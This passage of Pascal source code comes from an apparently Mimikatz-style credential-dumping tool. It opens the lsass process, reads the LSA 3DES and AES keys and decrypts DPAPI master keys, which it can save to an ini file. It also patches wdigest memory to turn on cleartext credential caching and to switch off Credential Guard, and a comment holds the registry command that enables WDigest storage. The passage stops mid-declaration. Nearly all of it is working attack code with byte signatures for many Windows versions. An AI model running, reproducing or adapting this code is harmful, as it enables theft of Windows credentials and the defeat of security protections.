log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0); //dd lsasrv!LsaInitializeProtectedMemory
writeln('offline out');
//lets search in lsass mem now
hprocess2:=openprocess( PROCESS_CREATE_PROCESS,false,pid);

//hprocess2:=openprocess( PROCESS_CREATE_PROCESS,false,clone);
InitializeObjectAttributes(oa,nil,0,0,nil);
cid.UniqueProcess :=pid;
cid.UniqueThread :=0;
status:=NtOpenProcess(@hprocess,PROCESS_VM_READ ,@oa,@cid);
write('NtOpenProcess ');
writeln(hprocess);
//automate if basic method fails

(*
if gethandles (upsapi._EnumProc2('wininit.exe'),'process',@callback2 ) then log('gethandles OK') else log('gethandles NOK');
hprocess:= lsass_handle;

*)
//
if (hprocess=thandle(-1)) or (hprocess=0) then
   begin
   writeln('openprocess failed - '+inttostr(getlasterror));
   exit;
   end
   else writeln('hprocess size:'+inttohex(hprocess,sizeof(hprocess)));

dwSize     :=sizeof(_OBJECT_BASIC_INFORMATION);
objectTypeInfo :=allocmem(dwSize);
//some AV's like bitdefender will return a handle with grantedaccess=0
//or duplicated grantedaccess=1FFFCF
//in both cases, we are missing PROCESS_VM_READ ...
writeln('here');
status:= NtQueryObject(hprocess,ObjectBasicInformation,objectTypeInfo,dwSize,@dwSize);
write('Status ');
writeln(status);
if status=0
   then
   begin
   writeln('GrantedAccess:'+inttohex(OBJECT_BASIC_INFORMATION(objectTypeInfo^).GrantedAccess,sizeof(dword) ));
   if (OBJECT_BASIC_INFORMATION(objectTypeInfo^).GrantedAccess and PROCESS_VM_READ) <> PROCESS_VM_READ
      then writeln('PROCESS_VM_READ failed');
   end
   else log('NtQueryObject failed - '+inttohex(status,sizeof(status)));

freemem(objectTypeInfo);
//we dont need the below apart from testing if module is loaded in lsass ...
{
lsasrvMem:=0;
EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded);
for count:=0 to cbneeded div sizeof(thandle) do
    begin
      GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) );
      dummy:=lowercase(strpas(szModName ));
      //writeln(dummy);
      if pos(module,dummy)>0 then
         begin
         lsasrvMem:=hMods[count];
         log('lsasrvMem:'+inttohex(lsasrvMem,sizeof(lsasrvMem)));
         break;
         end;
    end;
if lsasrvMem=0 then exit;
}

//InitializationVector
//Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction


//hprocess:=clone;
writeln('dopo error');
ivOffset:=0;
if ReadMem(hprocess, keySigOffset + IV_OFFSET, @ivOffset, 4)=false then
    begin
    log('ReadMem=false '+inttohex(keySigOffset + IV_OFFSET,sizeof(pointer)));
    writeln('readmem 1 '+winver);
    exit;
    end;
{$ifdef CPU64}
ivOffset:=keySigOffset + IV_OFFSET+ivOffset+4;
{$endif CPU64}
//will match dd lsasrv!InitializationVector
log('IV_OFFSET:'+inttohex(ivOffset,sizeof(pointer)),0); //dd InitializationVector
setlength(iv,16);
if ReadMem(hprocess, ivoffset, @iv[0], 16)=false then
    begin
    log('ReadMem=false '+inttohex(ivoffset,sizeof(pointer)));
    end;
log('IV:'+ByteToHexaString (IV),0);

//keySigOffset:7FFEEE887696
//target :     7ffeee94d998
//delta : 0C6302 // found : 44 63 0c 00 - 0c6344 - 0c6302=66 +4 = 70
//keySigOffset + DES_OFFSET = 7FFEEE887650 //DES_OFFSET:=-70

//7FFEEE94D9DA

//h3DesKey
// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
desOffset:=0;
if ReadMem(hprocess, keySigOffset + DES_OFFSET, @desOffset, 4)=false then
   begin
   log('ReadMem=false '+inttohex(keySigOffset + DES_OFFSET,sizeof(pointer)));
   writeln(winver);
   exit;
   end;
{$ifdef CPU64}
desOffset:=keySigOffset + DES_OFFSET+desOffset+4;
{$endif CPU64}
//will match dd lsasrv!h3DesKey
log('DES_OFFSET:'+inttohex(desOffset,sizeof(pointer)));
// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
if ReadMem(hprocess, desOffset, @keyPointer, sizeof(keyPointer))=false then writeln('readmem=false');
//writeln('keyPointer:'+inttohex(keyPointer,sizeof(pointer)));
// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
if ReadMem(hprocess, keyPointer, @h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY))=false then writeln('readmem=false');
log('TAG:'+strpas(h3DesKey.tag ));
// Read in the 3DES key
log('DES:');
writeln(winver);
if (winver='6.3.9600') or (copy(winver,1,3)='10.') or (copy(winver,1,3)='11.') then
   begin
   //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
   //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
   //writeln('hardkey cbSecret:'+inttostr(extracted3DesKey81.hardkey.cbSecret   ));
   //for i:=0 to extracted3DesKey81.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey81.hardkey.data[i],2));;
   setlength(DesKey ,extracted3DesKey81.hardkey.cbSecret);
   copymemory(@DesKey [0],@extracted3DesKey81.hardkey.data[0],extracted3DesKey81.hardkey.cbSecret);
   log(ByteToHexaString(deskey));
   end
   else
   begin
   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey, sizeof(KIWI_BCRYPT_KEY))=false then writeln('readmem=false');
   log('KIWI_BCRYPT_KEY:'+strpas(extracted3DesKey.tag ));
   //for i:=0 to extracted3DesKey.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey.hardkey.data[i],2));;
   setlength(DesKey ,extracted3DesKey.hardkey.cbSecret);
   copymemory(@DesKey [0],@extracted3DesKey.hardkey.data[0],extracted3DesKey.hardkey.cbSecret);
   log(ByteToHexaString(deskey));
   end;

//hAesKey
//Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
aesOffset:=0;
if ReadMem(hprocess, keySigOffset + AES_OFFSET, @aesOffset, 4)=false then
   begin
   log('ReadMem=false '+inttohex(keySigOffset + AES_OFFSET,sizeof(pointer)));
   exit;
   end;
{$ifdef CPU64}
aesOffset:=keySigOffset + AES_OFFSET+aesOffset+4;
{$endif CPU64}
//will match dd lsasrv!hAesKey
log('AES_OFFSET:'+inttohex(aesOffset,sizeof(pointer)));
// Retrieve pointer to h3AesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
ReadMem(hprocess, aesOffset, @keyPointer, sizeof(nativeuint));
// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
ReadMem(hprocess, keyPointer, @hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
// Read in AES key
log('AES:');

if (winver='6.3.9600') or (copy(winver,1,3)='10.') or (copy(winver,1,3)='11.') then
   begin
   //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
   //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
   if ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
   //for i:=0 to extractedAesKey81.hardkey.cbSecret -1 do write(inttohex(extractedAesKey81.hardkey.data[i],2));;
   setlength(aesKey ,extractedAesKey81.hardkey.cbSecret);
   copymemory(@aesKey [0],@extractedAesKey81.hardkey.data[0],extractedAesKey81.hardkey.cbSecret);
   log(ByteToHexaString(aesKey));
   end
   else
   begin
   ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey, sizeof(KIWI_BCRYPT_KEY));
   log('BCRYPT_KEYTAG:'+strpas(extractedAesKey.tag ));
   //for i:=0 to extractedAesKey.hardkey.cbSecret -1 do write(inttohex(extractedAesKey.hardkey.data[i],2));;
   setlength(aesKey ,extractedAesKey.hardkey.cbSecret);
   copymemory(@aesKey [0],@extractedAesKey.hardkey.data[0],extractedAesKey.hardkey.cbSecret);
   log(ByteToHexaString(aesKey));
   end;

result:=true;

end;

function dpapi(pid:dword;save:boolean=false):boolean;
const
  PTRN_W2K3_MasterKeyCacheList:array [0..7] of byte= ($4d, $3b, $ee, $49, $8b, $fd, $0f, $85);
  PTRN_WI60_MasterKeyCacheList:array [0..7] of byte= ($49, $3b, $ef, $48, $8b, $fd, $0f, $84);
  PTRN_WI61_MasterKeyCacheList:array [0..6] of byte= ($33, $c0, $eb, $20, $48, $8d, $05);  // InitializeKeyCache to avoid  version change
  PTRN_WI62_MasterKeyCacheList:array [0..12] of byte= ($4c, $89, $1f, $48, $89, $47, $08, $49, $39, $43, $08, $0f, $85);
  PTRN_WI63_MasterKeyCacheList:array [0..6] of byte= ($08, $48, $39, $48, $08, $0f, $85);
  PTRN_WI64_MasterKeyCacheList:array [0..7] of byte= ($48, $89, $4e, $08, $48, $39, $48, $08);
  PTRN_WI64_1607_MasterKeyCacheList:array [0..7] of byte= ($48, $89, $4f, $08, $48, $89, $78, $08);
//
 PTRN_WALL_MasterKeyCacheList_x86:array [0..3] of byte= ($33, $c0, $40, $a3);
 PTRN_WI60_MasterKeyCacheList_x86:array [0..9] of byte= ($8b, $f0, $81, $fe, $cc, $06, $00, $00, $0f, $84);
//
  CALG_SHA1 = $00008004;
var
  module:string='dpapisrv.dll'; //kuhl_m_sekurlsa_dpapi_svc_package
  pattern:array of byte;
  patch_pos:ShortInt=0;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr_:pointer;
  offset:nativeuint=0;
  offset_list:array[0..3] of byte;
  offset_list_dword:dword;
  list:array[0..sizeof(_KIWI_MASTERKEY_CACHE_ENTRY)-1] of byte;
  dgst:tbytes; //array[0..19] of byte;
  current:nativeuint;
  decrypted:tbytes;
  localft:FILETIME ;
  st:SYSTEMTIME ;
  bret:boolean;
begin
log( '**** dpapi ****');
result:=false;
//
   if (lowercase(osarch)='x86') then
   begin
   if copy(winver,1,3)='5.1' then //xp
      begin
      setlength(pattern,sizeof(PTRN_WALL_MasterKeyCacheList_x86));
      copymemory(@pattern[0],@PTRN_WALL_MasterKeyCacheList_x86[0],sizeof(PTRN_WALL_MasterKeyCacheList_x86));
      patch_pos:=-4;
      module:='lsasrv.dll';
      end;
   if copy(winver,1,3)='6.0' then //vista
      begin
      //symbol only?
      module:='lsasrv.dll';
      end ;
   if copy(winver,1,3)='6.1' then  //win7 & 2k8
      begin
      //symbol only?
      module:='lsasrv.dll';
      end ;
   if copy(winver,1,3)='6.2' then  //win8.0
      begin
      setlength(pattern,sizeof(PTRN_WI60_MasterKeyCacheList_x86));
      copymemory(@pattern[0],@PTRN_WI60_MasterKeyCacheList_x86[0],sizeof(PTRN_WI60_MasterKeyCacheList_x86));
      patch_pos:=16;
      end ;
      if copy(winver,1,3)='6.3' then  //win8.1 aka winblue
      begin
      setlength(pattern,sizeof(PTRN_WALL_MasterKeyCacheList_x86));
      copymemory(@pattern[0],@PTRN_WALL_MasterKeyCacheList_x86[0],sizeof(PTRN_WALL_MasterKeyCacheList_x86));
      patch_pos:=-4;
      end ;
   end;
  if (lowercase(osarch)='amd64') then
   begin
   if copy(winver,1,3)='5.1' then //xp
      begin
      module:='lsasrv.dll';  //?
      end;
   if copy(winver,1,3)='6.0' then //vista
      begin
      setlength(pattern,sizeof(PTRN_WI60_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI60_MasterKeyCacheList[0],sizeof(PTRN_WI60_MasterKeyCacheList));
      patch_pos:=-4;
      module:='lsasrv.dll';  //?
      end ;
   if copy(winver,1,3)='6.1' then  //win7 & 2k8
      begin
      setlength(pattern,sizeof(PTRN_WI61_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI61_MasterKeyCacheList[0],sizeof(PTRN_WI61_MasterKeyCacheList));
      patch_pos:=7;
      module:='lsasrv.dll'; //?
      end ;
   if copy(winver,1,3)='6.2' then  //win8.0
      begin
      setlength(pattern,sizeof(PTRN_WI62_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI62_MasterKeyCacheList[0],sizeof(PTRN_WI62_MasterKeyCacheList));
      patch_pos:=-4;
      end ;
   if copy(winver,1,3)='6.3' then  //win8.1 aka winblue
      begin
      setlength(pattern,sizeof(PTRN_WI63_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI63_MasterKeyCacheList[0],sizeof(PTRN_WI63_MasterKeyCacheList));
      patch_pos:=-10;
      end ;
   if (pos('-1507',winver)>0) {or (pos('-1509',winver)>0)} then //win10
      begin
      setlength(pattern,sizeof(PTRN_WI64_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_MasterKeyCacheList[0],sizeof(PTRN_WI64_MasterKeyCacheList));
      patch_pos:=-7;
      end;
   if (pos('-1607',winver)>0) {or (pos('-1609',winver)>0)} then //win10
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   if (pos('-1703',winver)>0) {or (pos('-1709',winver)>0)} then //win10
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   if (pos('-1803',winver)>0) {or (pos('-1809',winver)>0)} then //win10
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   if (pos('-1903',winver)>0) or (pos('-1909',winver)>0) then //win10
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   if (pos('-2004',winver)>0) {or (pos('-1909',winver)>0)} then //win10
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   if (pos('-20H2',winver)>0) {or (pos('-1909',winver)>0)} then //win10    //not verified
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   if (pos('-21H1',winver)>0) {or (pos('-1909',winver)>0)} then //win10    //not verified
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   if (pos('-21H2',winver)>0) {or (pos('-1909',winver)>0)} then //win10 & win11    //not verified
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   if (pos('-22H2',winver)>0) {or (pos('-1909',winver)>0)} then //win10 & win11    //not verified
      begin
      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
      patch_pos:=11;
      end;
   end;
//
  if symmode=true then
     begin
       try
       if _SymFromName (strpas(sysdir)+'\'+module,'g_MasterKeyCacheList',offset)
          then
             begin
             log('_SymFromName:'+inttohex(offset,sizeof(offset)));
             patch_pos:=-1;
             end
          else log('_SymFromName:failed');
       except
       on e:exception do log(e.Message );
       end;
     end;
//
if patch_pos=0 then
   begin
   log('patch_pos=0');
   exit;
   end;
//
if search_module_mem (pid,module,pattern,offset)=false then
   begin
   log('search_module_mem NOT OK');
   exit;
   end;
//
if offset=0 then exit;
log('found:'+inttohex(offset,sizeof(pointer)),0);
//
hprocess:=thandle(-1);
hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},
                                      false,pid);

  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);

               if patch_pos <>-1 then  //some more work to find the relative offset
               if ReadMem  (hprocess,offset+patch_pos,offset_list) then
               begin
                    CopyMemory(@offset_list_dword,@offset_list[0],4);
                    log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
                    //new offset to the list entry
                    {$ifdef CPU64}
                    offset:= offset+offset_list_dword+4+patch_pos;
                    {$endif CPU64}
                    {$ifdef CPU32}
                    offset:= offset_list_dword{+patch_pos};
                    {$endif CPU32}
               end; //if readmem

                    //finally do the work
                    //dd dpapisrv!g_MasterKeyCacheList
                    log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
                    //
                    //read sesslist at offset
                    ZeroMemory(@list[0],sizeof(list));
                    ReadMem  (hprocess,offset,list );
                    //lets skip the first one
                    current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.flink);
                    bret:=ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink,list );
                    log('*****************************************************',1);
                    if bret then
                    while PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink<>offset do
                    begin
                    //
                    log('LUID:'+inttohex(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.LogonId.LowPart,4) ,1) ;
                    log('GUID:'+GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),1) ;
                    FileTimeToLocalFileTime (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.insertTime,localft) ;
                    FileTimeToSystemTime(localft, st );
                    log('Time:'+DateTimeToStr (SystemTimeToDateTime (st)),1);
                    setlength(decrypted,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.keySize);
                    if decryptLSA (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.keySize ,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.key ,decrypted)=false
                    then log('decryptLSA NOT OK',1)
                    else
                    begin
                    log('MasterKey:'+ByteToHexaString(decrypted),1);
                    if crypto_hash_(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.keySize, dgst, SHA_DIGEST_LENGTH )
                       then log('SHA1:'+ByteToHexaString (dgst),1);
                    //
                    if save then
                       begin
                       writeini(GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),'MasterKey',ByteToHexaString(decrypted),'masterkeys.ini');
                       writeini(GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),'SHA1',ByteToHexaString (dgst),'masterkeys.ini');
                       //writeini(GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),'Time',DateTimeToStr (SystemTimeToDateTime (st)),'masterkeys.ini');
                       end;
                    //
                    end;
                    //next logsesslist
                    current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink);
                    ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink,list );
                    log('*****************************************************',1)
                    end;//while


       closehandle(hprocess);
       end;//if openprocess...
end;



{
see
https://gist.github.com/xpn/163360379f3cce2443a7b074f0a173b8
https://blog.xpnsec.com/exploring-mimikatz-part-1/
the below requires a reboot...
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
to query...
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
}
function wdigest_UseLogonCredential(pid:dword):boolean;
const

  //dd wdigest!g_fParameter_UseLogonCredential in windbg
  //or
  //search g_fParameter_UseLogonCredential in IDA  (spacceptcredentials)
  //look for cmp     cs:g_fParameter_UseLogonCredential, ebx
  //which translates to 39 1D F5  14 03 00
  //F5  14 03 00 is your offset (from current pos) to g_fParameter_UseLogonCredential
  //or we could maintain a table of offsets per windows versions...
  PTRN_WIN81_UseLogonCredential:array [0..14] of byte=       ($F7,$46,$50,$00,$08,$00,$00,$0F,$85,$0C,$52,$00,$00,$39,$1D);
  PTRN_WIN10_1703_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$11,$3B,$00,$00,$39,$1D);
  PTRN_WIN10_1803_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$EE,$6C,$00,$00,$39,$1D);
  PTRN_WIN10_1903_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$E2,$71,$00,$00,$39,$1D);

var
  module:string='wdigest.dll';
  hprocess:thandle;
  offset_dword:dword;
  offset:nativeuint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes; //array of byte;
  dw:dword;
begin
result:=false;
  if pid=0 then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,3)='6.3' then
        begin
        setlength(pattern,sizeof(PTRN_WIN81_UseLogonCredential));
        copymemory(@pattern[0],@PTRN_WIN81_UseLogonCredential[0],sizeof(PTRN_WIN81_UseLogonCredential));
        patch_pos:=4;
        end;
     if pos('-1703',winver)>0 then
        begin
        setlength(pattern,sizeof(PTRN_WIN10_1703_UseLogonCredential));
        copymemory(@pattern[0],@PTRN_WIN10_1703_UseLogonCredential[0],sizeof(PTRN_WIN10_1703_UseLogonCredential));
        patch_pos:=4;
        end;
     if pos('-1803',winver)>0 then
        begin
        setlength(pattern,sizeof(PTRN_WIN10_1803_UseLogonCredential));
        copymemory(@pattern[0],@PTRN_WIN10_1803_UseLogonCredential[0],sizeof(PTRN_WIN10_1803_UseLogonCredential));
        patch_pos:=4;
        end;
     if pos('-1903',winver)>0 then
        begin
        setlength(pattern,sizeof(PTRN_WIN10_1903_UseLogonCredential));
        copymemory(@pattern[0],@PTRN_WIN10_1903_UseLogonCredential[0],sizeof(PTRN_WIN10_1903_UseLogonCredential));
        patch_pos:=4;
        end;
     end; //if (lowercase(osarch)='amd64') then


  //if lowercase(getenv('g_fParameter_UseLogonCredential'))<>'' then
  if symmode=true then
     begin
     //patch_pos:=-1;
     //offset:=int64(strtoint('$'+getenv('g_fParameter_UseLogonCredential')));
     //log('env g_fParameter_UseLogonCredential:'+inttohex(offset,sizeof(offset)));
       try
       if _SymFromName (strpas(sysdir)+'\'+module,'g_fParameter_UseLogonCredential',offset)
          then
             begin
             log('_SymFromName:'+inttohex(offset,sizeof(offset)));
             patch_pos:=-1;
             end
          else log('_SymFromName:failed');
       except
       on e:exception do log(e.Message );
       end;
     end;

  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  if search_module_mem (pid,module,pattern,offset)=false then
     begin
     log('search_module_mem NOT OK');
     exit;
     end;
  //
  if offset=0 then exit;
  log('found:'+inttohex(offset,sizeof(pointer)),0);
  //
    hprocess:=thandle(-1);
    hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
    if hprocess<>thandle(-1) then
    begin
    log('openprocess ok',0);

    if patch_pos =-1 then //relative offset was provided
        begin
        //nothing to do here...
        end;

    if patch_pos <>-1 then  //some more work to find the relative offset
    if ReadMem  (hprocess,offset+sizeof(PTRN_WIN81_UseLogonCredential),@offset_dword,4) then
        begin
        //CopyMemory(@offset_dword,@offset_byte[0],4);
        log('ReadProcessMemory OK '+inttohex(offset_dword,4));
        offset:=offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_dword+patch_pos;
        end; //if readmem

        //finally do the work
        //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
        log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
        //dw:=1;
        ReadMem (hprocess,offset,@dw,4);
        log('g_fParameter_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
        dw:=ByteSwap32 (1);
        writemem(hprocess,offset,@dw,4);
        result:=true;

    closehandle(hprocess);
    end;


end;

//g_IsCredGuardEnabled -> set to 0
function wdigest_disableCredGuard(pid:dword):boolean;
const

  //dd wdigest!g_IsCredGuardEnabled in windbg
  //or
  //search g_IsCredGuardEnabled in IDA  (spacceptcredentials)
  //look for cmp     cs:g_IsCredGuardEnabled, ebx
  //which translates to 39 1D F5  14 03 00
  //F5  14 03 00 is your offset (from current pos) to g_fParameter_UseLogonCredential
  //or we could maintain a table of offsets per windows versions...
  PTRN_WIN10_1xxx_IsCredGuardEnabled:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$E2,$71,$00,$00,$39,$1D);

var
  module:string='wdigest.dll';
  hprocess:thandle;
  offset_dword:dword;
  offset:nativeuint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes; //array of byte;
  dw:dword;
begin
result:=false;
  if pid=0 then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
        if pos('-1903',winver)>0 then
        begin
        setlength(pattern,sizeof(PTRN_WIN10_1xxx_IsCredGuardEnabled));
        copymemory(@pattern[0],@PTRN_WIN10_1xxx_IsCredGuardEnabled[0],sizeof(PTRN_WIN10_1xxx_IsCredGuardEnabled));
        patch_pos:=4;
        end;
     end; //if (lowercase(osarch)='amd64') then


  //if lowercase(getenv('g_fParameter_UseLogonCredential'))<>'' then
  if symmode=true then
     begin
     //patch_pos:=-1;
     //offset:=int64(strtoint('$'+getenv('g_fParameter_UseLogonCredential')));
     //log('env g_fParameter_UseLogonCredential:'+inttohex(offset,sizeof(offset)));
       try
       if _SymFromName (strpas(sysdir)+'\'+module,'g_IsCredGuardEnabled',offset)
          then
             begin
             log('_SymFromName:'+inttohex(offset,sizeof(offset)));
             patch_pos:=-1;
             end
          else log('_SymFromName:failed');
       except
       on e:exception do log(e.Message );
       end;
     end;

  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  if search_module_mem (pid,module,pattern,offset)=false then
     begin
     log('search_module_mem NOT OK');
     exit;
     end;
  //
  if offset=0 then exit;
  log('found:'+inttohex(offset,sizeof(pointer)),0);
  //
    hprocess:=thandle(-1);
    hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
    if hprocess<>thandle(-1) then
    begin
    log('openprocess ok',0);

    if patch_pos =-1 then //relative offset was provided
        begin
        //nothing to do here...
        end;

    if patch_pos <>-1 then  //some more work to find the relative offset
    if ReadMem  (hprocess,offset+sizeof(PTRN_WIN10_1xxx_IsCredGuardEnabled),@offset_dword,4) then
        begin
        //CopyMemory(@offset_dword,@offset_byte[0],4);
        log('ReadProcessMemory OK '+inttohex(offset_dword,4));
        offset:=offset+sizeof(PTRN_WIN10_1xxx_IsCredGuardEnabled)+offset_dword+patch_pos;
        end; //if readmem

        //finally do the work
        //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
        log('g_IsCredGuardEnabled offset:'+inttohex(offset,sizeof(pointer)));
        //dw:=0;
        ReadMem (hprocess,offset,@dw,4);
        log('g_IsCredGuardEnabled value:'+inttostr(ByteSwap32(dw)));
        dw:=ByteSwap32 (0);
        writemem(hprocess,offset,@dw,4);
        result:=true;

    closehandle(hprocess);
    end;


end;

//check kuhl_m_sekurlsa_utils.c
function wdigest(pid:dword):boolean;
const
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
  // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
  //dd wdigest!l_LogSessList in windbg
  PTRN_WIN5_PasswdSet:array [0..3] of byte=  ($48, $3b, $da, $74);
  PTRN_WIN6_PasswdSet:array [0..3] of byte=  ($48, $3b, $d9, $74);
  //x86
  PTRN_WIN5_PasswdSet_X86:array    [0..6] of byte= ($74, $18, $8b, $4d, $08, $8b, $11);
  PTRN_WIN6_PasswdSet_X86:array    [0..6] of byte= ($74, $11, $8b, $0b, $39, $4e, $10);
  PTRN_WIN63_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0a, $39, $4e, $10);
  PTRN_WIN64_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0f, $39, $4e, $10);
  PTRN_WIN1809_PasswdSet_X86:array [0..6] of byte= ($74, $15, $8b, $17, $39, $56, $10);
var
  module:string='wdigest.dll';
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  offset_list:array[0..3] of byte;
  offset_list_dword:dword;
  read:cardinal;
  offset:nativeuint=0;
  patch_pos:ShortInt=0;
  pattern:array of byte;
  logsesslist:array [0..sizeof(i_logsesslist)-1] of byte;
